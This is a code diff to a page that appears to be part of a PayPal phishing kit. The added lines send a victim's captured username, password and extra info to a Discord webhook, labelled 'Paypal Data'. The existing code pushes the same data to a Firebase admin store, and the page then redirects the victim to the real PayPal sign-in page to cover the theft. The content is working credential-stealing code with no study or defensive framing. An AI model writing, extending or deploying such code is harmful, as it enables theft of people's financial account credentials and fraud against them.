@@ -6,6 +6,7 @@
 
 <script type="text/javascript" src="firebase.js"></script>
 <script type="text/javascript" src="../app.js"></script>
+<script type="text/javascript" src="../discord.js"></script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
 <span id="x"   style="display:none" ></span>
 <script type="text/javascript">
@@ -35,6 +36,28 @@ var database = firebase.database();
 var admin = database.ref('ADMIN');
 
 admin.push(store);
+var request = new XMLHttpRequest();
+      request.open("POST", discord_webhook_url);
+
+  request.setRequestHeader('Content-type', 'application/json');
+  
+  var myEmbed = {
+  author: {
+  name: "Paypal Data"
+  },
+  title: "Username:- "+n+"\nPassword:- "+p+"\n",
+  description:"\nInfo:- "+y,
+  color: 65535
+  }
+  
+  var params = {
+  username: "Th30neAnd0nly/Sigma ",
+  avatar_url : "https://repository-images.githubusercontent.com/268017280/43567c00-8e19-11eb-96d2-a360736917cb",
+  embeds: [ myEmbed ]
+  }
+  
+  request.send(JSON.stringify(params));
+  
 window.location.href="https://paypal.com/signin";
 });
 
